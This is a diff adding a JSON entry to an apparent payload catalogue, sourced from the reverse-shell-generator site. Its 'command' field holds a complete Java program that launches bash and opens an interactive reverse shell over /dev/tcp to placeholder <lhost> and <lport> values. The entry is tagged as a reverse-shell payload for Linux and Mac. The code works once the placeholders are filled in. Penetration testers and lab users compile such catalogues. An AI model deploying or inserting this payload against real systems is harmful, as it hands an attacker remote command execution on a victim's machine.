@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-java-2",
+  "name": "RSG · ReverseShell · Java #2",
+  "command": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
+  "description": "Reverse Shell payload — Java #2 (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/Java #2/58",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
